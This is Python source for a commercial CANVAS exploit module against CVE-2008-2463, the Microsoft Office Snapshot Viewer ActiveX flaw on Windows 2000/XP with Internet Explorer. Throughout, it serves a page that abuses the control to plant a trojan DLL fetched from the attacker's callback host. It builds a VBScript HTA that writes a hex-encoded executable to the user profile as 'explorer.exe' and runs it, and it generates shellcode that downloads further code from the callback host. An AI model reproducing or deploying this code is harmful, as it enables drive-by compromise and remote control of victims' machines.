#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2008
#


import sys

if '.' not in sys.path: 
	sys.path.append('.')

from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside
from canvasexploit import canvasexploit
from libs.canvasos import *
from MOSDEF import pelib 

import canvasengine
import struct
import os

# GUI info
NAME = "Microsoft Office Snapshot Viewer ActiveX Vulnerability - Generic Version"

DESCRIPTION = "Vulnerability in Microsoft Office Snapshot Viewer ActiveX"
DOCUMENTATION = {}
DOCUMENTATION["Date public"] = "2008.07.07"
DOCUMENTATION["References"] = "http://secunia.com/advisories/30883"
DOCUMENTATION["CVE Name"] = "CVE-2008-2463"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2463"
DOCUMENTATION["Notes"]= """
The MOSDEF trojan will be executed after the first HTTPS web site access. So activate the SSL with
D2 Client Insider.
"""

VERSION = '1.0'

GTK2_DIALOG = 'dialog.glade2'

PROPERTY={}
PROPERTY['TYPE'] = 'Exploit'
PROPERTY['SITE'] = 'Clientside'
PROPERTY['ARCH'] = [['Windows']]
PROPERTY['VERSION'] = ['2000','XP']

NOTES="""
Usage:
.\commandlineInterface.py -p 443 -v 1
.\exploits\httpserver\httpserver.py -v 1 -O singleexploit:d2sec_snpvw2 -l 192.168.41.1 -d 443 -p 80
"""

CHANGELOG="""
"""

targets = {    
    0:['Windows 2000 SP4, XP SP0-SP2 with IE'],
}

	
class theexploit(tcpexploit,httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.clientversion = 1
        self.name = NAME 
        self.filename = "index.html"
        self.trojanname = "index.hta"
        self.trojandll = "msupdate.html"
        self.dllname = "schannel.dll"
        return

    def makefile(self):
        filedata = """
<HTML> 
<BODY>
 
<DIV id="targetDiv">

</DIV>

<SCRIPT language="javascript">  

function refresh() 
{  	
	window.location.href = "HTTPSURL";
}

try {		
	var detect = new ActiveXObject("snpvw.Snapshot Viewer Control.1");
	
	if (detect) {	
		setTimeout("refresh()", 5000);
	
		document.getElementById("targetDiv").innerHTML = "<object classid='clsid:F0E42D50-368C-11D0-AD81-00A0C90DC8D9' id='target'></object>";	
							
		target.SnapshotPath = "MOSDEFTROJANURL";
		target.CompressedPath = "MOSDEFTROJANPATH";
		target.PrintSnapshot();   				
	}
}
catch(e) {}

</SCRIPT> 

</BODY> 
</HTML>                
"""
        
        filedata = filedata.replace("MOSDEFTROJANURL", "http://" + self.callback.ip + "/" + self.trojandll)
        filedata = filedata.replace("MOSDEFTROJANPATH", self.dllname)
        filedata = filedata.replace("HTTPSURL", "https://www.microsoft.com/")

        if self.useSSL:
        	filedata = filedata.replace('http:', 'https:')
        
        return filedata

    def file4hta(self, exename):
    	evilprog = "explorer.exe"
    	e = []
    	for a in exename:
    		for b in a:
			if b == "\r":
				d = "0d"
			elif b == "\n":
				d = "0a"
			elif b == "\0":
				d = "00"
			else:
				c = hex(ord(b))
				d = c.replace("0x", "")
	
			if len(d) == 1:
				d = "0"+d
	
			e.append(d)
	
    	i = 0
    	j = 0
    	l = len(e)

    	hta = "<SCRIPT language=vbs>\n\n"
    	while 1:
		hta += " prog = prog & \""
	
		while i != 24:
			hta += "%s," % e[j]
			if j == l-1:
				break
			i += 1
			j += 1
	
		if j == l-1:
			hta = hta[:-1] + "\"\n\n"
			break
		hta += "\"\n"
		i = 0

    	hta += " tmp = Split(prog, \",\")\n"	
    	hta += " Set fso = CreateObject(\"Scripting.FileSystemObject\")\n"
    	hta += " Set shell = CreateObject(\"WScript.Shell\")\n"
    	hta += " userprofile = shell.ExpandEnvironmentStrings(\"%USERPROFILE%\")\n"
    	hta += " path = userprofile & \"\\\" & \"%s\"\n" % evilprog
    	hta += " Set f = fso.CreateTextFile(path, True)\n\n"
    	hta += " For i = 0 To UBound(tmp)\n"
    	hta += "   prog = Int(\"&H\" & tmp(i))\n"
    	hta += "   f.Write Chr(prog)\n"
    	hta += " Next\n\n"
    	hta += " f.Close\n"
    	hta += " shell.Run Chr(34) & path & Chr(34), 7, false\n"
    	hta += " self.Close\n"
    	hta += "</SCRIPT>\n"

    	return hta 
			

    def maketrojan(self):
        host = self.callback.ip
        port = self.callback.port

        sc = shellcodeGenerator.win32()
        sc.addAttr("findeipnoesp", {"subespval":0x1000})                
                        	
        if self.useSSL:
            ssl = "s"
        else:
            ssl = ""                
                    
        sc.addAttr("httpGetShellcode", {"URL":"http%s://%s:%d/w" % (ssl, host, port)})
        shellcode = sc.get()        
        myPElib = pelib.PElib()
	
        self.mosdeftrojan = myPElib.createPEFileBuf(shellcode)
        
        self.log("Writing out %d bytes to %s" % (len(self.mosdeftrojan), self.trojanname))
        
        self.htafile = self.file4hta(self.mosdeftrojan)
        file(self.trojanname, "wb").write(self.htafile)
        self.setInfo("%s - done" % (NAME))
        ret = len(self.mosdeftrojan) != 0
        
        return ret


    def str_unicode(self, str):
        u = ""
        u += "\x00%s" % chr(len(str))

        for s in str:
		u += "\x00" + s

        return u


    def updatedll(self):
        trojanurl = "http://" + self.callback.ip + "/" + self.trojanname

        if self.useSSL:
        	trojanurl = trojanurl.replace('http:', 'https:')
        
        url = "\x00\x05\x00D\x002\x00U\x00R\x00L"
		
        i = open(os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_snpvw2/schannel.dll", "rb")
        o = open(self.dllname, "wb")

        url_u = self.str_unicode(trojanurl)

        self.log("Updating %s" % self.dllname)
        
        data = i.read()
        start = data.find(url)
        
        if (start >= 0):
        	newdata = data[0:start] + url_u + data[start+len(url_u):]                
        	data = newdata

        o.write(data)
        
        i.close()
        o.close()


    def makesploit(self, clientheader, clientbody):        
        from libs.spkproxy import header, body
        h = header('SERVER')
        b = body()
        
        self.maketrojan()
        self.updatedll()
        
        if clientheader.URL.count(self.filename):                        
            sploitstring = self.makefile()            
            b.setBody(sploitstring)
            
        elif clientheader.URL.count(self.trojanname):
            self.log("Sending MOSDEF trojan")
            f = open(self.trojanname, "rb")
            sploitstring = f.read()
            f.close()
            os.remove(self.trojanname)
            self.log("Sending %d bytes"%len(sploitstring))
            h.addHeader("Content-type","binary/octet-stream")
            h.addHeader("Connection","close")
            b.setBody(sploitstring)
            
        elif clientheader.URL.count(self.trojandll):
            self.log("Sending DLL trojan")
            f = open(self.dllname, "rb")
            sploitstring = f.read()
            f.close()
            os.remove(self.dllname)
            self.log("Sending %d bytes"%len(sploitstring))
            h.addHeader("Content-type","binary/octet-stream")
            h.addHeader("Connection","close")
            b.setBody(sploitstring)
               
        else:
            self.log("Redirecting to self")
            h.status = "302"
            h.addHeader('Location', self.filename)
            h.addHeader('Content-Type', 'binary/octet-stream')
        return h, b

    def neededListenerTypes(self):
        from canvasengine import HTTPMOSDEF
        return [HTTPMOSDEF]
            
    def run(self):        
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
